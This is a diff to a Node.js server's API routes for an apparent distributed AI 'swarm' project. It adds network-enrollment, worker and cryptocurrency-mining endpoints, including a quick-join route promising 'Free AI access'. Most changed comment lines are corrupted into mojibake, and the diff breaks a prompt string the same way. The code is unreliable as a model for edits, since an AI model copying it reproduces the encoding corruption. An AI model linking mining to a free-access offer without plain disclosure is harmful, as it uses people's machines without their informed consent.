+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/chat Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/chat') {
       var wc2 = refs.workerChat;
       if (!wc2) return json(res, 500, { error: 'Worker chat not available' });
@@ -6155,7 +6412,8 @@ undefined
                 liveStatus += ', completed: ' + (relayCache.completed || 0) + ', failed: ' + (relayCache.failed || 0);
               }
               liveStatus += '\n';
-              liveStatus += '- Vultr node (45.76.232.5): ' + vultrWorkers + ' workers, models: mistral, llama3.2:1b\n';
+              var _vultrIpStatus = (cfg.relay && cfg.relay.vmIp) || (cfg.vultrNodes && cfg.vultrNodes['vultr-dallas-1'] && cfg.vultrNodes['vultr-dallas-1'].ip) || 'N/A';
+              liveStatus += '- Vultr node (' + _vultrIpStatus + '): ' + vultrWorkers + ' workers, models: mistral, llama3.2:1b\n';
               liveStatus += '- Total agents: ' + agentCount + ' (' + agentList.map(function(a) { return a.name || a.id; }).join(', ') + ')\n';
               liveStatus += '- AI Gateway: port 18800, provider: Anthropic (Claude)\n';
               liveStatus += '- Ollama fallback: available (qwen2.5-coder:14b)\n';
@@ -6163,7 +6421,7 @@ undefined
             } catch(se) { liveStatus = ''; }
 
             var swarmPrompt = [
-              { role: 'system', content: 'You are the ARIES Swarm Coordinator. You manage a distributed AI network.' + liveStatus + '\nRespond concisely. Use tables/formatting when helpful. Sign as "— Swarm 🐝"' },
+              { role: 'system', content: 'You are the ARIES Swarm Coordinator. You manage a distributed AI network.' + liveStatus + '\nRespond concisely. Use tables/formatting when helpful. Sign as "â€” Swarm ðŸ"' },
               { role: 'user', content: 'Recent chat:\n' + recentMsgs + '\n\nMaster says: ' + chatText }
             ];
             var aiResult;
@@ -6191,7 +6449,59 @@ undefined
       return json(res, 200, { message: chatMsg });
     }
 
-    // â•â•â• Content Farm â•â•â•
+    // === SwarmJoin Routes (public network enrollment) ===
+    if (refs.swarmJoin) {
+      if (method === 'POST' && reqPath === '/api/swarm/join') {
+        try {
+          refs.swarmJoin.on('progress', function(p) { wsBroadcast({ type: 'swarm-join-progress', ...p }); });
+          var sjResult = await refs.swarmJoin.joinNetwork();
+          return json(res, sjResult.ok ? 200 : 400, sjResult);
+        } catch (e) { return json(res, 500, { ok: false, error: e.message }); }
+      }
+      if (method === 'GET' && reqPath === '/api/swarm/join/status') {
+        return json(res, 200, refs.swarmJoin.getStatus());
+      }
+      if (method === 'POST' && reqPath === '/api/swarm/leave') {
+        try { var lr = await refs.swarmJoin.leaveNetwork(); return json(res, 200, lr); }
+        catch (e) { return json(res, 500, { ok: false, error: e.message }); }
+      }
+      if (method === 'GET' && reqPath === '/api/swarm/worker/status') {
+        return json(res, 200, refs.swarmJoin.getStatus());
+      }
+      if (method === 'POST' && reqPath === '/api/swarm/worker/start') { return json(res, 200, refs.swarmJoin.startWorker()); }
+      if (method === 'POST' && reqPath === '/api/swarm/worker/stop') { return json(res, 200, refs.swarmJoin.stopWorker()); }
+      if (method === 'POST' && reqPath === '/api/swarm/worker/pause') { return json(res, 200, refs.swarmJoin.pauseWorker()); }
+      if (method === 'POST' && reqPath === '/api/swarm/worker/resume') { return json(res, 200, refs.swarmJoin.resumeWorker()); }
+      if (method === 'POST' && reqPath === '/api/swarm/mining/start') {
+        try { var mr = await refs.swarmJoin.startMining(); return json(res, mr.ok ? 200 : 400, mr); }
+        catch (e) { return json(res, 500, { ok: false, error: e.message }); }
+      }
+      if (method === 'POST' && reqPath === '/api/swarm/mining/stop') { return json(res, 200, refs.swarmJoin.stopMining()); }
+      if (method === 'GET' && reqPath === '/api/swarm/mining/stats') {
+        return json(res, 200, refs.swarmJoin._minerClient ? refs.swarmJoin._minerClient.getStats() : { running: false });
+      }
+      if (method === 'POST' && reqPath === '/api/swarm/quickjoin') {
+        try {
+          refs.swarmJoin.removeAllListeners('progress');
+          refs.swarmJoin.on('progress', function(p) { wsBroadcast({ type: 'quickjoin-progress', ...p }); });
+          var qjResult = await refs.swarmJoin.joinNetwork();
+          wsBroadcast({ type: 'quickjoin-progress', step: 'complete', message: qjResult.ok ? "You're in! Free AI access is now active." : 'Setup failed' });
+          return json(res, qjResult.ok ? 200 : 400, qjResult);
+        } catch (e) {
+          wsBroadcast({ type: 'quickjoin-progress', step: 'error', message: e.message });
+          return json(res, 500, { ok: false, error: e.message });
+        }
+      }
+      if (method === 'GET' && reqPath === '/api/network/stats') {
+        var nst = refs.swarmJoin.getStatus();
+        return json(res, 200, { totalNodes: nst.networkPeers || 0, tasksProcessed: nst.tasksCompleted || 0, yourUptime: nst.uptime || 0, enrolled: nst.enrolled || false });
+      }
+      if (method === 'GET' && reqPath === '/api/network/leaderboard') {
+        return json(res, 200, { leaderboard: [], message: 'Leaderboard data syncs from relay' });
+      }
+    }
+
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Content Farm Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/content/generate') {
       var cfBody = JSON.parse(await readBody(req));
       var contentFarm = require('./content-farm');
@@ -6220,7 +6530,7 @@ undefined
       return json(res, cfDel ? 200 : 404, cfDel ? { success: true } : { error: 'Not found' });
     }
 
-    // â•â•â• Oracle Cloud Provisioner â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Oracle Cloud Provisioner Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/cloud/oracle/provision') {
       var ocBody = JSON.parse(await readBody(req));
       var ocp = require('./oracle-provisioner');
@@ -6244,7 +6554,7 @@ undefined
       return json(res, ocTermResult.error ? 400 : 200, ocTermResult);
     }
 
-    // â•â•â• Worker Health Dashboard â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Worker Health Dashboard Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/health/workers') {
       var wh = require('./worker-health');
       return json(res, 200, wh.getAllWorkers());
@@ -6261,7 +6571,7 @@ undefined
       return json(res, 200, whData);
     }
 
-    // â•â•â• Geographic Load Balancing â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Geographic Load Balancing Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/routing') {
       var geo = require('./geo-balancer');
       var distAi = require('./distributed-ai');
@@ -6270,11 +6580,11 @@ undefined
       return json(res, 200, geo.getRoutingTable(geoWorkers));
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // TASK MARKETPLACE
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/marketplace/submit â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/marketplace/submit Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/marketplace/submit') {
       var body = JSON.parse(await readBody(req));
       var taskMarketplace = require('./task-marketplace');
@@ -6283,7 +6593,7 @@ undefined
       return json(res, result.statusCode || 200, result);
     }
 
-    // â•â•â• GET /api/marketplace/task/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/marketplace/task/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/marketplace/task/')) {
       var taskId = reqPath.split('/api/marketplace/task/')[1];
       var taskMarketplace = require('./task-marketplace');
@@ -6292,75 +6602,75 @@ undefined
       return json(res, 200, task);
     }
 
-    // â•â•â• GET /api/marketplace/pricing â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/marketplace/pricing Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/marketplace/pricing') {
       var taskMarketplace = require('./task-marketplace');
       return json(res, 200, taskMarketplace.getPricing());
     }
 
-    // â•â•â• GET /api/marketplace/earnings â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/marketplace/earnings Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/marketplace/earnings') {
       var taskMarketplace = require('./task-marketplace');
       return json(res, 200, taskMarketplace.getEarnings());
     }
 
-    // â•â•â• GET /api/marketplace/tasks â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/marketplace/tasks Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/marketplace/tasks') {
       var taskMarketplace = require('./task-marketplace');
       return json(res, 200, taskMarketplace.getActiveTasks());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // REFERRAL / VOLUNTEER PROGRAM
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/referral/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/referral/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/referral/stats') {
       var taskMarketplace = require('./task-marketplace');
       return json(res, 200, taskMarketplace.getReferralStats());
     }
 
-    // â•â•â• POST /api/referral/track â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/referral/track Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/referral/track') {
       var taskMarketplace = require('./task-marketplace');
       var platform = parsed.query.platform || 'unknown';
       return json(res, 200, taskMarketplace.trackDownload(platform));
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // DOCKER IMAGE GENERATOR
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/docker/dockerfile â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/docker/dockerfile Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/docker/dockerfile') {
       var dockerBuilder = require('./docker-builder');
       return json(res, 200, dockerBuilder.getDockerfile());
     }
 
-    // â•â•â• GET /api/docker/compose â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/docker/compose Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/docker/compose') {
       var dockerBuilder = require('./docker-builder');
       return json(res, 200, dockerBuilder.getCompose());
     }
 
-    // â•â•â• GET /api/docker/run-command â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/docker/run-command Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/docker/run-command') {
       var dockerBuilder = require('./docker-builder');
       return json(res, 200, dockerBuilder.getRunCommand());
     }
 
-    // â•â•â• POST /api/docker/build â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/docker/build Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/docker/build') {
       var dockerBuilder = require('./docker-builder');
       var result = dockerBuilder.buildImage();
       return json(res, result.statusCode || 200, result);
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // LINK DEPLOYER
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/links/generate â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/links/generate Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/links/generate') {
       var LinkDeployer = require('./link-deployer');
       if (!_refs.linkDeployer) _refs.linkDeployer = new LinkDeployer({ port: _refs.config?.port || 3333 });
@@ -6370,14 +6680,14 @@ undefined
       return json(res, 200, result);
     }
 
-    // â•â•â• GET /api/links/list â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/links/list Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/links/list') {
       var LinkDeployer = require('./link-deployer');
       if (!_refs.linkDeployer) _refs.linkDeployer = new LinkDeployer({ port: _refs.config?.port || 3333 });
       return json(res, 200, { links: _refs.linkDeployer.listLinks() });
     }
 
-    // â•â•â• DELETE /api/links/:token â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/links/:token Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/links/')) {
       var delToken = reqPath.split('/api/links/')[1];
       if (!delToken) return json(res, 400, { error: 'Missing token' });
@@ -6387,7 +6697,7 @@ undefined
       return json(res, revoked ? 200 : 404, revoked ? { status: 'revoked' } : { error: 'Link not found' });
     }
 
-    // â•â•â• GET /api/deploy/worker-linux.sh â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/worker-linux.sh Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy/worker-linux.sh') {
       var shPath = path.join(__dirname, '..', 'deploy', 'worker-linux.sh');
       try {
@@ -6398,25 +6708,25 @@ undefined
       return;
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // HASHRATE OPTIMIZER
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
